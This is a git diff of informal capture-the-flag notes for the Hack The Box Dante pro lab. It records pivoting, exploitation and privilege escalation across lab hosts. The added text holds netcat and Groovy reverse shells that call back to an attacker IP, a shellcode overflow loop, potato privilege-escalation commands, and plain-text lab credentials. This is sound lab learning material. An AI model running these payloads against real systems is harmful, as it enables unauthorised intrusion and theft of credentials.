@@ -187,12 +187,13 @@ The Pivoting cmds
 ssh -D 8888 -N balthazar@10.10.110.100
 sshuttle -r balthazar@10.10.110.100 172.16.1.0/24
 ```
+Balthazar Passwd: `TheJoker12345!`
 
 The `8888` port should be mentioned in the `/etc/proxychains.conf` file
 
 ## An open goal
 
-I performed the basic scan on `NIX01` and found 2 FTP (`172.16.1.5, 172.16.1.12`) servers `.5` was working with anon login and I found a flag in it. I wasn't the next flag but still a flag.
+I performed the basic scan on `NIX01` and found 2 FTP (`172.16.1.5, 172.16.1.12`) servers `.5` was working with anon login and I found a flag in it. It wasn't the next flag but still a flag. [[#172 16 1 5]]
 
 Note: FTP was only working through `NIX01` not on my machine due to security reasons implemented on FTP side, It was logging in but not executing any commands.
 
@@ -458,8 +459,38 @@ We get the flag.
 
 ## MinatoTW strikes again
 
+The problem with the exploit was we were not able to upload any files. So we have to go to the registration form and upload the winpeas and nc binaries with png extensions and the names are changes in the directory we were in. So we had to change them back to execute them.
 
+```bash
+python3 omrs.py -u http://172.16.1.102/ -c 'powershell -nop -c "Rename-Item -Path 'd5ffca6b7e2bf2854daa85f71841ccf21632552801.png' -NewName 'nc.exe' " ' -m 6789 -p 1234
 
+python3 omrs.py -u http://172.16.1.102/ -c ".\nc.exe 10.10.14.23 1210 -e C:\Windows\System32\cmd.exe" -m 6789 -p 1234
+
+```
+
+and we get our reverse shell as we already uploaded the winpeas we can just change it's name too and execute it.
+
+```PowerShell
+powershell -nop -c "Rename-Item -Path '69f5c4ece9a03196703160274d6aa9671632552801.png' -NewName 'winpeas.exe' " 
+```
+
+Tried to run Rogue Potato but windows Defender was stopping it from giving a shell but we can see a `C:\Apps\SERVER.EXE` in the windows defender whitelist paths
+
+So it maybe our path to salvation. After finding out we should do buffer overflow and he flag task name being `MinatoTW`  I did a quick google search to find 
+
+`copy C:\Users\Administrator\Desktop\flag.txt C:\xampp\htdocs\user\images\flag3.txt`
+
+```
+.\RoguePotato.exe -r 10.10.14.23 -e "dir C:\Users\Administrator > out1.txt" -l 4444
+```
+
+copy C:\Users\blake\Desktop\flag.txt  C:\xampp\htdocs\user\images\flag2.txt
+
+```
+.\RoguePotato.exe -r 10.10.14.23 -e ".\nc64.exe 10.10.14.23 4433 -e C:\Windows\System32\cmd.exe" -l 4444
+```
+
+For some reason the flag was there and it worked with rogue potato for someone else I think, So I just used it, tried to replicate it but it wasn't working. Well I'll ask in discord later again.
 
 ## Feeling fintastic
 
@@ -503,7 +534,7 @@ https://www.exploit-db.com/exploits/48512
 
 So we follow the instructions to get a reverse shell. Turns out not all shells are being uploaded and with a normal `?cmd` not all commands are being executed, some kind of filtering maybe we google AV bypass shells.
 
-My bad it's not that the commands are being limited but it was a fucking windows machine now I have to look for windows reverse shells. So what we do is upload at `nc.exe` and use it to do a reverse shell.
+My bad it's not that the commands are being limited but it was a fucking windows machine now I have to look for windows reverse shells. So what we do is upload (was taking in files when we register/sign-in) at `nc.exe` and use it to do a reverse shell.
 
 We also have to upload a shell.php which we can use to execute the scripts.
 
@@ -533,7 +564,7 @@ Turns out access is denied so I just use the previous way how we uploaded `nc.ex
 
 and we find out  a vulnerable service call Druva insync and we search for it's exploits.
 
-We find a python exploit and a powershell exploit as python is not on windows we ps script.
+We find a python exploit and a powershell exploit as python is not on windows we use ps script.
 
 The script is a POC so it doesn't do anything so we have to change the `$cmd` variable in it to give us a reverse shell.
 
@@ -542,6 +573,7 @@ $cmd = "C:\xampp\htdocs\discuss\ups\nc.exe 10.10.14.23 4443 -e C:\Windows\System
 ```
 
 and we get a reverse shell and we find the flag in `Administrator/Desktop`
+
 
 ## That just blew my mind
 
@@ -587,6 +619,8 @@ Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 mrb3n:Welcome1:2104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
 ```
 
+`administrator:KillEmAll! `
+
 We load kiwi and use `lsa_dump_secrets` and find put the default login password for it `DishonestSupermanDiablo5679` we don't know the username but from `creds_msv`, I think it is `katwamba`
 
 Let's try to rdp into the machine with katwamba creds and it works, we find our flag on the desktop.
@@ -604,15 +638,10 @@ We find employee backup on the desktop you can download it in remmina(you'll hav
 The excel sheet looks like it only has username but if you look care fully at the top of the column you'll find that B is hidden clicking on it we find the passwords. Copy them for later use.
 
 
-
-
-
-chisel.exe client 10.10.14.22:9002 R:9999:socks
-
 ## Update the policy!
 
 
-`.101`
+`1.101`
 
 We have ftp and winrm open and smb is not replying.
 
@@ -668,3 +697,219 @@ upload /home/HTB/HTB-writeups/Pro-Labs/Dante/assets/winPEASx64.exe
 You can upgrade to admin from an unquoted service path but I'm not going to do it now because lost fucking metasploit.
 
 
+# Double Pivot
+
+From what I can understand It's a routing thing not a pivoting thing, that's why we can't access the `.2.*` network. So I have to go to a previously exploited linux machine and add a `.2.*` route and use sshuttle to our machine and access it. The only properly shell accessible with root machine is `.1.10` so we try and test it. 
+
+```bash
+ip route add 172.16.2.0/24 via 172.16.1.1
+```
+`TractorHeadtorchDeskmat`
+
+We do sshuttle things same as before
+
+```bash
+ssh -D 1080 -N frank@172.16.1.10
+sshuttle -r frank@172.16.1.10 172.16.2.0/24
+```
+frank Passwd: `TractorHeadtorchDeskmat`
+
+From the words of a god on discord.
+![[Pasted image 20211009221406.png]]
+
+I still couldn't access the `2.101` from the firefox history.
+
+So I tried a dumb thing by looking at this from varonis [AD enum](https://www.varonis.com/blog/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/)
+
+and got this and everything started to fall into its place.
+
+```bash
+crackmapexec winrm 172.16.2.0/24 -u administrator -p "KillEmAll!"
+```
+
+![[Pasted image 20211009221641.png]]
+
+`evil-winrm -i  172.16.2.5 -u administrator -p "KillEmAll!"`
+
+but we can't ssh into any machine from `winrm` so we try to rdp into it but it is blocked so we try to turn it on and then try again which worked.
+
+Turning RDP on => https://pureinfotech.com/enable-remote-desktop-powershell-windows-10/
+
+```
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+```
+
+We can see that we have `2.6, 2.101` in 2.5 through `arp -a`
+
+After scanning properly(which I didn't) we find out that we have to we have to ssh into them. [[#172 16 2 101]] machine, [[#172 16 2 6]] machine
+
+## One misconfig to rule them all...
+
+We access a powershell session to `2.5` from `1.20`  or login via evil-winrm after doing sshuttle from `.10`
+
+We force trust `2.5` and get the session
+
+```PowerShell
+Set-Item wsman:\localhost\client\TrustedHosts -Value 172.16.2.5 -Force
+$cred = get-credential (login as administrator)
+Enter-PSSession -ComputerName 172.16.2.5 -Credential $cred
+```
+
+![[Pasted image 20211006131654.png]]
+
+We find a `jenkins.bat` file, we know `1.19` has jenkins login so we use the cred we find.
+
+`Admin_129834765:SamsungOctober102030`
+
+## It's getting hot in here
+
+We find the flag in `C:\Users\jbercov\Desktop`
+
+## Very well, sir
+
+We find the in the FLAG_HERE script?? or smn
+
+Now we open the `script console`  and try to get a reverse shell from the groovy script, we found a ton of reverse shell scripts on google for groovy.
+
+```Groovy
+Thread.start {
+String host="10.10.14.23";
+
+int port=4242;
+
+String cmd="bash";
+
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+}
+```
+
+and we just run this with a listener on our machine. If the target was a windows one we would've used `String cmd="cmd.exe";`
+
+For an interactive shell
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+We're logged in as jenkins so we try to do horizontal priv esc and just run `pspy64` for cronjobs and we find this.
+
+![[Pasted image 20211006182941.png]]
+
+```bash
+2021/10/06 05:57:01 CMD: UID=0    PID=8718   | /bin/sh -c /bin/bash mysql -u ian -p VPN123ZXC
+```
+
+We found ian creds running a mysql cron and we switch user
+
+## We're going round in circles
+
+We do the same shit we do for user recon
+
+```bash
+id
+sudo -l
+crontab -l 
+sudo --version
+uname -a
+```
+
+In `id` we find that ian is in disk group and from hacktricks we can do priv esc 
+
+First we have to find where `\` is mounted in the system.
+![[Pasted image 20211006184756.png]]
+
+```bash
+df -h
+debugfs /dev/sda5
+cat /root/flag.txt
+```
+
+## 172.16.2.101
+
+We can use previous creds from [[#Minus minus plus]] of julian and use it to ssh into it and find the user flag.
+
+There's a folder named PEDA which is a clone of this repo => https://github.com/longld/peda and from the name of the next flag heading I think it is a BoF. So I googled for a python gdb bufferoverflow script or smn similar and we find this
+
+```python
+import os
+for i in range(255):
+        os.system(""" /usr/sbin/readfile $(python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+"A"*(88-27)+"{}\xe3\xff\xff\xff\x7f"') """.format("\\x"+hex(i).split('x')[1]))
+```
+
+When this code is executed it continuously overflows and when you do `ctrl+c` a root shell will pop and we can get the flag
+
+## 172.16.2.6
+
+We can access `2.6` only from `2.101` not eve `2.5` we use the same creds as julian from previous to ssh into it and we get in and wind the first flag.
+
+We also find the below message which hints to `1.5` machine.
+
+![[Pasted image 20211010130932.png]]
+
+We don't find any other users but just in case we check the `/etc/passwd`for users and we find there's another user called `plongbottom` who we found creds for in the employee creds file from `1.20` and we switch to that user and check id and see he's in the sudo grp which means we can directly switch
+
+```bash
+id
+```
+
+
+![[Pasted image 20211013134638.png]]
+
+`plongbottom:PowerfixSaturdayClub777`
+
+```bash
+sudo su
+```
+
+we are root and we find the flag
+
+## 172.16.1.5
+
+We find the below creds for `MSSQL` from `2.6` and use them to login
+
+mssql => `Sophie:XTerrorInflictPurpleDirt996655`
+
+Using sqsh we can easily login but it opens a mssql shell which is pretty shit.
+
+`sqsh -S 172.16.1.5 -U Sophie -P TerrorInflictPurpleDirt996655`
+
+So we use this cheatsheet => https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+
+We can execute commands using xp_cmd in the sql shell.
+
+```MSSQL
+EXEC xp_cmdshell 'ls';
+```
+
+We can find sophie creds in `C:\DB_Backups\db_backup.ps1`
+
+winrm => `sophie:Alltheleavesarebrown1`
+
+```bash
+evil-winrm -i 172.16.1.5 -u sophie -p "Alltheleavesarebrown1"
+```
+
+and checking privs and sysinfo it looks like we can do Juicy Potato exploit (`SeChangeNotifyPrivilege - enabled`).
+
+```
+whoami /priv
+Get-ComputerInfo
+```
+
+![[Pasted image 20211013214653.png]]
+![[Pasted image 20211012153117.png]]
+
+We can download the potato.exe from => https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard
+
+Some other sources for potato walkthroughs 
+- https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato
+
+There was no need to input CLSID here. 
+
+potato => `echo "type C:\users\administrator\desktop\flag.txt" | .\jp.exe -p C:\windows\system32\cmd.exe -t * -l 9999`
+
+The command is echoed and then the potato was executed because the shell pops for a second and then dies was probably same with the rogue potato will try again later.
+
+You find flags in sophie folder,  admin folder and ftp folder in `C:\`for `1.5` and also another one at the start when you did anon login in ftp.
